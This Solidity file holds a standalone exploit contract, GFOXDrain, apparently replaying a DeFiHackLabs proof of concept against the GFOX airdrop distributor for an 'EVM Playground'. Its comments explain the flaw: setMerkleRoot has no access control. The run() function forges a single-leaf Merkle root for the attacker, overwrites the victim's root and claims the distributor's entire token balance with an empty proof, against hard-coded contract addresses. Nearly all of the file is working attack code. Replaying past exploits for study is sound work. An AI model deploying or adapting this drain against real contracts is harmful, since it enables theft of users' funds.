// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-05-GFOX).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker == address(this); there is no standalone exploit contract). This
// contract is a faithful, self-contained copy of that inline attack (forge a
// single-leaf Merkle root, overwrite it permissionlessly, then claim against
// it with an empty proof) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/GFOX_exp.sol::testExploit().
//
// Root cause: the GFOX airdrop/Merkle distributor's setMerkleRoot(bytes32) has
// NO access-control modifier, so anyone can overwrite the airdrop's root of
// trust. The attacker computes root = keccak256(to, amount) for an
// (attacker, entire-balance) leaf, sets it as the new root, then calls
// claim(attacker, amount, []) — the empty proof verifies because a single-leaf
// tree's leaf IS its root — draining the instant-claim 75% share.

interface IVictim {
    function setMerkleRoot(bytes32 _merkleRoot) external;
    function claim(address to, uint256 amount, bytes32[] calldata proof) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract GFOXDrain {
    IVictim private constant victim = IVictim(0x11A4a5733237082a6C08772927CE0a2B5f8A86B6);
    IERC20 private constant gfox = IERC20(0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662);

    // No access control on setMerkleRoot() — anyone can forge the airdrop's
    // root of trust and claim against a single-leaf tree of their own making.
    function run() external {
        uint256 amount = 1_780_453_099_185_000_000_000_000_000; // the distributor's entire GFOX balance
        bytes32 root = keccak256(abi.encodePacked(address(this), amount));
        victim.setMerkleRoot(root);
        victim.claim(address(this), amount, new bytes32[](0));
    }
}
